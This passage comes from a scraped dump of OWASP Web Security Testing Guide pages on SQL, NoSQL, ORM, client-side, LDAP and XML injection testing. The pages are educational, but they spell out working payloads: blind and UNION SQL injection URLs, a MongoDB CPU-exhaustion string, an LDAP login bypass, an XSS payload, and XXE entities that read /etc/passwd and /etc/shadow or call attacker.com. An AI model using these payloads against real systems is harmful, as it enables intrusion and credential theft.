essential to exploit blind SQL injections. For other advanced operators, please refer to the documents in the references.\n\n#### Attributes Enumeration\n\nIn order to enumerate the column of a database table, it is possible to use a common error-based technique. In short, we can obtain the attributes name by analyzing error messages and repeating the query with different selectors. For example, assuming that we know the existence of a column, we can also obtain the name of the remaining attributes with the following query:\n\n`' GROUP BY Id%00`\n\nIn the error message received, it is possible to observe the name of the next column. At this point, we can iterate the method until we obtain the name of all attributes. If we don't know the name of the first attribute, we can still insert a fictitious column name and obtain the name of the first attribute within the error message.\n\n#### Obtaining Database Schema\n\nVarious system tables exist by default in MS Access that can be potentially used to obtain table names and columns. Unfortunately, in the default configuration of recent MS Access database releases, these tables are not accessible. Nevertheless, it is always worth trying:\n\n- MSysObjects\n- MSysACEs\n- MSysAccessXML\n\nFor example, if a union SQL injection vulnerability exists, you can use the following query:\n\n`' UNION SELECT Name FROM MSysObjects WHERE Type = 1%00`\n\nAlternatively, it is always possible to bruteforce the database schema by using a standard wordlist (e.g. [FuzzDb](https://github.com/fuzzdb-project/fuzzdb)).\n\nIn some cases, developers or system administrators do not realize that including the actual `.mdb` file within the application webroot can allow to download the entire database. Database filenames can be inferred with the following query:\n\n`https://www.example.com/page.app?id=1'+UNION+SELECT+1+FROM+name.table%00`\n\nwhere `name` is the `.mdb` filename and `table` is a valid database table. In case of password protected databases, multiple software utilities can be used to crack the password. Please refer to the references.\n\n### Blind SQL Injection Testing\n\n[Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) vulnerabilities are by no means the most easily exploitable SQL injections while testing real-life applications. In case of recent versions of MS Access, it is also not feasible to execute shell commands or read/write arbitrary files.\n\nIn case of blind SQL injections, the attacker can only infer the result of the query by evaluating time differences or application responses. It is supposed that the reader already knows the theory behind blind SQL injection attacks, as the remaining part of this section will focus on MS Access specific details.\n\nThe following example is used:\n\n`https://www.example.com/index.php?myId=[sql]`\n\nwhere the ID parameter is used within the following query:\n\n`SELECT * FROM orders WHERE [id]=$myId`\n\nLet's consider the `myId` parameter vulnerable to blind SQL injection. As an attacker, we want to extract the content of column `username` in the table `users`, assuming that we have already disclosed the database schema.\n\nA typical query that can be used to infer the first character of the username of the 10th rows is:\n\n`https://www.example.com/index.php?id=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users)='a',0,'no')`\n\nIf the first character is `a`, the query will return `0` or otherwise the string `no`.\n\nBy using a combination of the `IFF, MID, LAST` and `TOP` functions, it is possible to extract the first character of the username on a specifically selected row. As the inner query returns a set of records, and not just one, it is not possible to use it directly. Fortunately, we can combine multiple functions to extract a specific string.\n\nLet's assume that we want to retrieve the username of the 10th row. First, we can use the TOP function to select the first ten rows using the following query:\n\n`SELECT TOP 10 username FROM users`\n\nThen, using this subset, we can extract the last row by using the LAST function. Once we have only one row and exactly the row containing our string, we can use the IFF, MID and LAST functions to infer the actual value of the username. In our example, we employ IFF to return a number or a string. Using this trick, we can distinguish whether we have a true response or not, by observing application error responses. As `id` is numeric, the comparison with a string results in a SQL error that can be potentially leaked by `500 Internal Server Error pages`. Otherwise, a standard `200 OK` page will be likely returned.\n\nFor example, we can have the following query:\n\n`https://www.example.com/index.php?id='%20AND%201=0%20OR%20'a'=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users))='a','a','b')%00`\n\nthat is TRUE if the first character is 'a' or false otherwise.\n\nAs mentioned, this method allows to infer the value of arbitrary strings within the database:\n\n1. By trying all printable values, until we find a match\n2. By inferring the length of the string using the `LEN` function, or by simply stopping after we have found all characters\n\nTime-based blind SQL injections are also possible by abusing [heavy queries](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)).\n\n## References\n\n- [Access Through Access - Brett Moore](https://packetstormsecurity.com/files/65967/Access-Through-Access.pdf.html)\n- [Access SQL Injection - Brett Moore](https://seclists.org/pen-test/2003/May/74)\n- [MS Access: Functions](https://www.techonthenet.com/access/functions/index_alpha.php)\n- [Microsoft Access - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_Access)\n", "timestamp": "2025-10-24T11:39:52.279862"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md", "content": "# Testing for NoSQL Injection\n\n## Summary\n\nNoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a [procedural language](https://en.wikipedia.org/wiki/Procedural_programming), rather than in the [declarative SQL language](https://en.wikipedia.org/wiki/Declarative_programming), the potential impacts are greater than traditional SQL injection.\n\nNoSQL database calls are written in the application's programming language, a custom API call, or formatted according to a common convention (such as `XML`, `JSON`, `LINQ`, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as `< > & ;` will not prevent attacks against a JSON API, where special characters include `/ { } :`.\n\nThere are hundreds of NoSQL databases available for use within an application, providing APIs in a variety of languages and relationship models. Each offers different features and restrictions. Because there is not a common language between them, example injection code will not apply across all NoSQL databases. For this reason, anyone testing for NoSQL injection attacks will need to familiarize themselves with the syntax, data model, and underlying programming language in order to craft specific tests.\n\nNoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.\n\nAdditional timing attacks may be relevant to the lack of concurrency checks within a NoSQL database. These are not covered under injection testing. At the time of writing MongoDB is the most widely used NoSQL database, and so all examples will feature MongoDB APIs.\n\n## How to Test\n\n### Testing for NoSQL Injection Vulnerabilities in MongoDB\n\nThe MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON query assembly tool. However, according to MongoDB documentation - unserialized JSON and [JavaScript expressions](https://docs.mongodb.org/manual/faq/developers/#javascript) are permitted in several alternative query parameters. The most commonly used API call allowing arbitrary JavaScript input is the `$where` operator.\n\nThe MongoDB `$where` operator typically is used as a simple filter or check, as it is within SQL.\n\n`db.myCollection.find( { $where: \"this.credits`` ``==`` ``this.debits\" } );`\n\nOptionally JavaScript is also evaluated to allow more advanced conditions.\n\n`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`\n\n### Example 1\n\nIf an attacker were able to manipulate the data passed into the `$where` operator, that attacker could include arbitrary JavaScript to be evaluated as part of the MongoDB query. An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization.\n\n`db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;`\n\nAs with testing other types of injection, one does not need to fully exploit the vulnerability to demonstrate a problem. By injecting special characters relevant to the target API language, and observing the results, a tester can determine if the application correctly sanitized the input. For example within MongoDB, if a string containing any of the following special characters were passed unsanitized, it would trigger a database error.\n\n`' \" \\ ; { }`\n\nWith normal SQL injection, a similar vulnerability would allow an attacker to execute arbitrary SQL commands - exposing or manipulating data at will. However, because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code. For example, instead of just causing an error when testing, a full exploit would use the special characters to craft valid JavaScript.\n\nThis input `0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)` inserted into `$userInput` in the above example code would result in the following JavaScript function being executed. This specific attack string would case the entire MongoDB instance to execute at 100% CPU usage for 10 second.\n\n`function() { return obj.credits - obj.debits < 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); }`\n\n### Example 2\n\nEven if the input used within queries is completely sanitized or parameterized, there is an alternate path in which one might trigger NoSQL injection. Many NoSQL instances have their own reserved variable names, independent of the application programming language.\n\nFor example within MongoDB, the `$where` syntax itself is a reserved query operator. It needs to be passed into the query exactly as shown; any alteration would cause a database error. However, because `$where` is also a valid PHP variable name, it may be possible for an attacker to insert code into the query by creating a PHP variable named `$where`. The PHP MongoDB documentation explicitly warns developers:\n\nPlease make sure that for all special query operators (starting with `$`) you use single quotes so that PHP doesn't try to replace `$exists` with the value of the variable `$exists`.\n\nEven if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data.\n\n`db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );`\n\nOne way to potentially assign data to PHP variables is via HTTP Parameter Pollution (see: [Testing for HTTP Parameter pollution](04-Testing_for_HTTP_Parameter_Pollution.md)). By creating a variable named `$where` via parameter pollution, one could trigger a MongoDB error indicating that the query is no longer valid. Any value of `$where` other than the string `$where` itself, should suffice to demonstrate vulnerability. An attacker would develop a full exploit by inserting the following:\n\n`$where: function() { //arbitrary JavaScript here }`\n\n## References\n\n### Injection Payloads\n\n- [Injection payload wordlist with examples of NoSQL Injection for MongoDB](https://github.com/cr0hn/nosqlinjection_wordlists)\n\n### Whitepapers\n\n- [Bryan Sullivan from Adobe: \"NoSQL, But Even Less Security\"](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20NoSQL%20But%20Even%20Less%20Security.pdf)\n- [Erlend from Bekk Consulting: Security NOSQL-injection](https://erlend.oftedal.no/blog/?blogid=110)\n- [Felipe Aragon from Syhunt: \"NoSQL/SSJS Injection\"](hhttps://www.syhunt.com/en/?n=Articles.NoSQLInjection)\n- [MongoDB Documentation: \"How does MongoDB address SQL or Query injection?\"](https://docs.mongodb.org/manual/faq/developers/#how-does-mongodb-address-sql-or-query-injection)\n- [PHP Documentation: \"MongoDB Driver Classes\"](https://www.php.net/manual/en/book.mongodb.php)\n- [Hacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)\n- [Attacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html)\n", "timestamp": "2025-10-24T11:39:52.398725"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md", "content": "# Testing for ORM Injection\n\n## Summary\n\n[Object Relational Mapping (ORM) Injection](https://capec.mitre.org/data/definitions/109.html) is an attack using SQL Injection against an ORM generated data access object model. From the point of view of a tester, this attack is virtually identical to a SQL Injection attack. However, the injection vulnerability exists in code generated by the ORM layer.\n\nThe benefits of using an ORM tool include quick generation of an object layer to communicate to a relational database, standardize code templates for these objects, and that they usually provide a set of safe functions to protect against SQL Injection attacks. ORM generated objects can use SQL or in some cases, a variant of SQL, to perform CRUD (Create, Read, Update, Delete) operations on a database. It is possible, however, for a web application using ORM generated objects to be vulnerable to SQL Injection attacks if methods can accept unsanitized input parameters.\n\n## How to Test\n\nORM layers can be prone to vulnerabilities, as they extend the surface of attack. Instead of directly targeting the application with SQL queries, you'd be focusing on abusing the ORM layer to send malicious SQL queries.\n\n### Identify the ORM Layer\n\nTo efficiently test and understand what's happening between your requests and the backend queries, and as with everything related to conducting proper testing, it is essential to identify the technology being used. By following the [information gathering](../01-Information_Gathering/README.md) chapter, you should be aware of the technology being used by the application at hand. Check this [list mapping languages to their respective ORMs](https://en.wikipedia.org/wiki/List_of_object-relational_mapping_software).\n\n### Abusing the ORM Layer\n\nAfter identifying the possible ORM being used, it becomes essential to understand how its parser is functioning, and study methods to abuse it, or even maybe if the application is using an old version, identify CVEs pertaining to the library being used. Sometimes, ORM layers are not properly implemented, and thus allow for the tester to conduct normal [SQL Injection](05-Testing_for_SQL_Injection.md), without worrying about the ORM layer.\n\n#### Weak ORM Implementation\n\nA vulnerable scenario where the ORM layer was not implemented properly, taken from [SANS](https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-hibernate):\n\n```java\nList results = session.createQuery(\"from Orders as orders where orders.id = \" + currentOrder.getId()).list();\nList results = session.createSQLQuery(\"Select * from Books where author = \" + book.getAuthor()).list();\n```\n\nThe above didn't implement the positional parameter, which allows the developer to replace the input with a `?`. An example would be as such:\n\n```java\nQuery hqlQuery = session.createQuery(\"from Orders as orders where orders.id = ?\");\nList results = hqlQuery.setString(0, \"123-ADB-567-QTWYTFDL\").list(); // 0 is the first position, where it is dynamically replaced by the string set\n```\n\nThis implementation leaves the validation and sanitization to be done by the ORM layer, and the only way to bypass it would be by identifying an issue with the ORM layer.\n\n#### Vulnerable ORM Layer\n\nORM layers are code, third-party libraries most of the time. They can be vulnerable just like any other piece of code. One example could be the [sequelize ORM npm library](https://snyk.io/blog/sequelize-orm-npm-library-found-vulnerable-to-sql-injection-attacks/) which was found to be vulnerable in 2019. In another research done by [RIPS Tech](https://www.ripstech.com/), bypasses were identified in the [hibernate ORM used by Java](https://hibernate.org/orm/).\n\nBased on their [blog article](https://blog.ripstech.com/2020/exploiting-hibernate-injections/), a cheat sheet that could allow the tester to identify issues could be outlined as follows:\n\n| DBMS       | SQL Injection                                                         |\n|------------|-----------------------------------------------------------------------|\n| MySQL      | `abc\\' INTO OUTFILE --`                                               |\n<!-- markdownlint-disable-next-line MD055 MD056 -->\n| PostgreSQL | `$$='$$=chr(61) || chr(0x27) and 1=pg_sleep(2) || version()'`         |\n| Oracle     | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'`  |\n| MS SQL     | `1<LEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)` |\n\nAnother example would include the [Laravel Query-Builder](https://laravel.com/docs/7.x/queries), which was found to be [vulnerable in 2019](https://freek.dev/1317-an-important-security-release-for-laravel-query-builder).\n\n## References\n\n- [Wikipedia - ORM](https://en.wikipedia.org/wiki/Object-relational_mapping)\n- [New Methods for Exploiting ORM Injections in Java Applications (HITB16)](https://insinuator.net/2016/06/new-methods-for-exploiting-orm-injections-in-java-applications-hitb16/)\n- [HITB2016 Slides - ORM Injections in Java Applications](https://archive.conference.hitb.org/hitbsecconf2016ams/sessions/new-methods-for-exploiting-orm-injections-in-java-applications/)\n- [Fixing SQL Injection: ORM is not enough](https://snyk.io/blog/sql-injection-orm-vulnerabilities/)\n- [PayloadsAllTheThings - HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)\n", "timestamp": "2025-10-24T11:39:52.466021"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md", "content": "# Testing for Client-side\n\n## Summary\n\nClient-side SQL injection occurs when an application implements the [Web SQL Database](https://www.w3.org/TR/webdatabase/) technology and doesn't properly validate the input nor parametrize its query variables. This database is manipulated by using JavaScript (JS) API calls, such as `openDatabase()`, which creates or opens an existing database.\n\n## Test Objectives\n\nThe following test scenario will validate that proper input validation is conducted. If the implementation is vulnerable, the attacker can read, modify, or delete information stored within the database.\n\n## How to Test\n\n### Identify the Usage of Web SQL DB\n\nIf the tested application implements the Web SQL DB, the following three calls will be used in the client-side core:\n\n- `openDatabase()`\n- `transaction()`\n- `executeSQL()`\n\nThe code below shows an example of the APIs' implementation:\n\n```javascript\nvar db = openDatabase(shortName, version, displayName, maxSize);\n\ndb.transaction(function(transaction) {\n    transaction.executeSql('INSERT INTO LOGS (time, id, log) VALUES (?, ?, ?)', [dateTime, id, log]);\n});\n```\n\n### Web SQL DB Injection\n\nAfter confirming the usage of `executeSQL()`, the attacker is ready to test and validate the security of its implementation.\n\nThe Web SQL DB's implementation is based on [SQLite's syntax](https://www.sqlite.org/lang.html).\n\n#### Bypassing Conditions\n\nThe following example shows how this could be exploited on the client-side:\n\n```javascript\n// URL example: https://example.com/user#15\nvar userId = document.location.hash.substring(1,); // Grabs the ID without the hash -> 15\n\ndb.transaction(function(transaction){\n    transaction.executeSQL('SELECT * FROM users WHERE user = ' + userId);\n});\n```\n\nTo return information for all the users, instead of only the user corresponding to the attacker, the following could be used: `15 OR 1=1` in the URL fragment.\n\n> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nFor additional SQL Injection payloads, go to the [Testing for SQL Injection](05-Testing_for_SQL_Injection.md) scenario.\n\n## Remediation\n\nFollow the same remediation from the [Testing for SQL Injection's Remediation Section](05-Testing_for_SQL_Injection.md#remediation).\n\n## References\n\n- [W3C Web SQL Database](https://www.w3.org/TR/webdatabase/)\n- [Apple's JavaScript Database Tutorial](https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/SafariJSDatabaseGuide/UsingtheJavascriptDatabase/UsingtheJavascriptDatabase.html)\n- [Tutorialspoint HTML5 Web SQL Database](https://www.tutorialspoint.com/html5/html5_web_sql.htm)\n- [Portswigger's Client-Side SQL Injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n", "timestamp": "2025-10-24T11:39:52.550848"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md", "content": "# Testing for LDAP Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-06|\n\n## Summary\n\nThe Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other objects. [LDAP injection](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by manipulating input parameters afterwards passed to internal search, add, and modify functions.\n\nA web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application.\n\n[Rfc2254](https://www.ietf.org/rfc/rfc2254.txt) defines a grammar on how to build a search filter on LDAPv3 and extends [Rfc1960](https://www.ietf.org/rfc/rfc1960.txt) (LDAPv2).\n\nAn LDAP search filter is constructed in Polish notation, also known as [Polish notation prefix notation](https://en.wikipedia.org/wiki/Polish_notation).\n\nThis means that a pseudo code condition on a search filter like this:\n\n`find(\"cn=John & userPassword=mypass\")`\n\nwill be represented as:\n\n`find(\"(&(cn=John)(userPassword=mypass))\")`\n\nBoolean conditions and group aggregations on an LDAP search filter could be applied by using the following metacharacters:\n\n| Metachar |  Meaning              |\n|----------|-----------------------|\n| &        |  Boolean AND          |\n| \\|       |  Boolean OR           |\n| !        |  Boolean NOT          |\n| =        |  Equals               |\n| ~=       |  Approx               |\n| >=       |  Greater than         |\n| <=       |  Less than            |\n| *        |  Any character        |\n| ()       |  Grouping parenthesis |\n\nMore complete examples on how to build a search filter can be found in the related RFC.\n\nA successful exploitation of an LDAP injection vulnerability could allow the tester to:\n\n- Access unauthorized content\n- Evade application restrictions\n- Gather unauthorized information\n- Add or modify Objects inside LDAP tree structure\n\n## Test Objectives\n\n- Identify LDAP injection points.\n- Assess the severity of the injection.\n\n## How to Test\n\n### Example 1: Search Filters\n\nLet's suppose we have a web application using a search filter like the following one:\n\n`searchfilter=\"(cn=\"+user+\")\"`\n\nwhich is instantiated by an HTTP request like this:\n\n`https://www.example.com/ldapsearch?user=John`\n\nIf the value `John` is replaced with a `*`, by sending the request:\n\n`https://www.example.com/ldapsearch?user=*`\n\nthe filter will look like:\n\n`searchfilter=\"(cn=*)\"`\n\nwhich matches every object with a 'cn' attribute equals to anything.\n\nIf the application is vulnerable to LDAP injection, it will display some or all of the user's attributes, depending on the application's execution flow and the permissions of the LDAP connected user.\n\nA tester could use a trial-and-error approach, by inserting in the parameter `(`, `|`, `&`, `*` and the other characters, in order to check the application for errors.\n\n### Example 2: Login\n\nIf a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to SQL and XPATH injection ).\n\nLet's suppose a web application uses a filter to match LDAP user/password pair.\n\n`searchlogin= \"(&(uid=\"+user+\")(userPassword={MD5}\"+base64(pack(\"H*\",md5(pass)))+\"))\";`\n\nBy using the following values:\n\n```txt\nuser=*)(uid=*))(|(uid=*\npass=password\n```\n\nthe search filter will results in:\n\n`searchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\";`\n\nwhich is correct and always true. This way, the tester will gain logged-in status as the first user in LDAP tree.\n\n## Tools\n\n- [Softerra LDAP Browser](https://www.ldapadministrator.com)\n\n## References\n\n- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n\n### Whitepapers\n\n- [Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?](httphttps://www.networkdls.com/articles/ldapinjection.pdf)\n- [IBM paper: Understanding LDAP](https://www.redbooks.ibm.com/redbooks/pdfs/sg244986.pdf)\n- [RFC 1960: A String Representation of LDAP Search Filters](https://www.ietf.org/rfc/rfc1960.txt)\n- [LDAP injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n", "timestamp": "2025-10-24T11:39:52.655572"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md", "content": "# Testing for XML Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-07|\n\n## Summary\n\nXML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.\n\nThis section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).\n\n## Test Objectives\n\n- Identify XML injection points.\n- Assess the types of exploits that can be attained and their severities.\n\n## How to Test\n\nLet's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `user>`node in an `xmlDb` file.\n\nLet's suppose the xmlDB file is like the following:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n</users>\n```\n\nWhen a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.\n\nFor example, the following values:\n\n```txt\nUsername: tony\nPassword: Un6R34kb!e\nE-mail: s4tan@hell.com\n```\n\nwill produce the request:\n\n`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`\n\nThe application, then, builds the following node:\n\n```xml\n<user>\n    <username>tony</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n</user>\n```\n\nwhich will be added to the xmlDB:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n    <username>tony</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\n### Discovery\n\nThe first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.\n\nXML metacharacters are:\n\n- Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.\n\nAs an example, let's suppose there is the following attribute:\n\n`<node attrib='$inputValue'/>`\n\nSo, if:\n\n`inputValue = foo'`\n\nis instantiated and then is inserted as the attrib value:\n\n`<node attrib='foo''/>`\n\nthen, the resulting XML document is not well formed.\n\n- Double quote: `\"` - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.\n\n`<node attrib=\"$inputValue\"/>`\n\nSo if:\n\n`$inputValue = foo\"`\n\nthe substitution gives:\n\n`<node attrib=\"foo\"\"/>`\n\nand the resulting XML document is invalid.\n\n- Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:\n\n`Username = foo<`\n\nthe application will build a new node:\n\n```xml\n<user>\n    <username>foo<</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n</user>\n```\n\nbut, because of the presence of the open '<', the resulting XML document is invalid.\n\n- Comment tag: `<!--/-->` - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:\n\n`Username = foo<!--`\n\nthe application will build a node like the following:\n\n```xml\n<user>\n    <username>foo<!--</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n</user>\n```\n\nwhich won't be a valid XML sequence.\n\n- Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.\n\nFor example:\n\n`<tagnode>&lt;</tagnode>`\n\nis well formed and valid, and represents the `<` ASCII character.\n\nIf `&` is not encoded itself with `&amp;`, it could be used to test XML injection.\n\nIn fact, if an input like the following is provided:\n\n`Username = &foo`\n\na new node will be created:\n\n```xml\n<user>\n    <username>&foo</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n</user>\n```\n\nbut, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.\n\n- CDATA section delimiters: `<!\\[CDATA\\[ / ]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.\n\nFor example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:\n\n```xml\n<node>\n    <![CDATA[<foo>]]>\n</node>\n```\n\nso that `<foo>` won't be parsed as markup and will be considered as character data.\n\nIf a node is created in the following way:\n\n`<username><![CDATA[<$userName]]></username>`\n\nthe tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.\n\n`userName = ]]>`\n\nthis will become:\n\n`<username><![CDATA[]]>]]></username>`\n\nwhich is not a valid XML fragment.\n\nAnother test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.\n\nLet's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.\n\n```xml\n<html>\n    $HTMLCode\n</html>\n```\n\nThen, an attacker can provide the following input:\n\n`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`\n\nand obtain the following node:\n\n```xml\n<html>\n    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>\n</html>\n```\n\nDuring the processing, the CDATA section delimiters are eliminated, generating the following HTML code:\n\n```html\n<script>\n    alert('XSS')\n</script>\n```\n\nThe result is that the application is vulnerable to XSS.\n\nExternal Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.\n\nTo test for XXE vulnerabilities, one can use the following input:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///dev/random\" >]>\n        <foo>&xxe;</foo>\n```\n\nThis test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.\n\nOther useful tests are the following:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"https://www.attacker.com/text.txt\" >]><foo>&xxe;</foo>\n```\n\n### Tag Injection\n\nOnce the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.\n\nLet's 